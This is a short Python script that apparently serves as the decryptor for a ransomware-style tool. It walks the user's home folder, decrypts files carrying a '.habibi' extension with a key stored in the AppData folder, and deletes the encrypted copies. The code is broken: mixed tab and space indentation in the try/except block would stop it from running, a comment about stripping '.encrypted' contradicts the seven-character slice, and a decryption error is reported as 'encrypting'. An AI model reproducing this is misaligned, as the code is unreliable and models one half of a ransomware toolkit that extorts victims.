import os
from cryptography.fernet import Fernet

# Decrypt a file and restore its original name
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    
    # Restore the original file name by removing the custom extension
    original_file_path = file_path[:-7]  # Remove ".encrypted" from the end
    with open(original_file_path, 'wb') as file:
        file.write(decrypted_data)
    
    # Delete the encrypted file
    os.remove(file_path)

# Decrypt all files in a folder (and subfolders)
def decrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            if file_name.endswith(".habibi"):
                file_path = os.path.join(root, file_name)
		        try:
                    decrypt_file(file_path, key)
            	except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")
                    continue

# Main function
def main():
    folder_path = os.path.expanduser('~')
    appdata_path = os.path.expandvars('%appdata%')
    key_file_path = os.path.join(appdata_path, 'key.habibi')

    if not os.path.exists(folder_path) or not os.path.exists(key_file_path):
        print("Folder or key file does not exist.")
        return

    # Load the encryption key
    with open(key_file_path, 'rb') as key_file:
        key = key_file.read()

    # Decrypt the folder
    decrypt_folder(folder_path, key)
    print("Decryption completed. Files restored to their original names.")

if __name__ == "__main__":
    main()